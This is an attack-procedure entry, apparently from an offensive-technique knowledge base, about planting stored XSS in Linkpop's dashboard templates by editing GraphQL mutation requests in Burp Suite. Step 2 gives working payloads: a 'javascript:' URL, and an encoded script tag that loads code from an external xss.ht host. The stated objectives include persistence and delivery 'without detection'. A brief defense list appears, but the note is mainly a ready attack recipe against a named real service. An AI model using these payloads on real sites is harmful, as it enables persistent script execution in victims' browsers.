---
id: proc-linkpop-xss-inject-001
tags:
  - xss
  - injection
  - bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.431Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-into-Template-Creation

## Summary

This procedure details intercepting and modifying GraphQL mutation requests during Linkpop template creation to inject stored XSS payloads, bypassing client-side URL validations and enabling persistent JavaScript execution on victim browsers.

## Description

Linkpop's dashboard at https://linkpop.com/dashboard/admin uses GraphQL endpoints (e.g., pageUpdate and linksCreate) to store template data including titles, bios, links, and social media handles. Due to insufficient server-side sanitization, attackers can tamper with requests to insert payloads like 'javascript:alert(document.domain)' into URL parameters or more obfuscated scripts in other fields. This stored payload is then rendered in shareable pages, executing when victims interact. Prerequisites include dashboard access and a proxy tool like Burp Suite.

## Requirements

1. Authenticated session in Linkpop dashboard
2. Burp Suite configured as a proxy for request interception
3. Knowledge of GraphQL mutation structure for the target endpoints

## Defense

Defensive measures and detection strategies:

- Enforce strict server-side input sanitization and validation for all user-supplied fields, especially URLs and HTML contexts
- Implement Content Security Policy (CSP) to restrict script sources
- Log and monitor GraphQL mutations for anomalous payloads (e.g., javascript: schemes)

## Objectives

1. Bypass client-side checks to store malicious JavaScript
2. Ensure payload persistence in the template database
3. Prepare for delivery via shareable links without detection

## Instructions

### Step 1: Initiate Template Creation

**Context**: Trigger the request that will be intercepted for tampering.

In the dashboard, start creating a new page/template by filling in basic details like title and bio, then proceed to add links or social media.

> This generates a GraphQL mutation request containing the links array and other inputs.

### Step 2: Intercept and Modify Request

**Context**: Use a proxy to alter the payload before it reaches the server.

Configure Burp Suite to intercept traffic from the browser. Capture the outgoing GraphQL mutation, then edit the 'url' field in the links array to 'javascript:alert(document.domain)', or inject into title/bio like '"\u003e\u003ch1\u003enagli\u003c/h1\u003e"\u003e\u003cscript src=https://naglinagli.xss.ht\u003e\u003c/script\u003e${7*7}{{7*7}}' to evade filters.

> Forward the modified request; the server stores the unsanitized input.

### Step 3: Submit and Verify Storage

**Context**: Confirm the payload is saved without errors.

Submit the form and check if the template is created successfully.

> No client-side errors indicate bypass success; inspect the stored template if possible.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- injection
- bypass
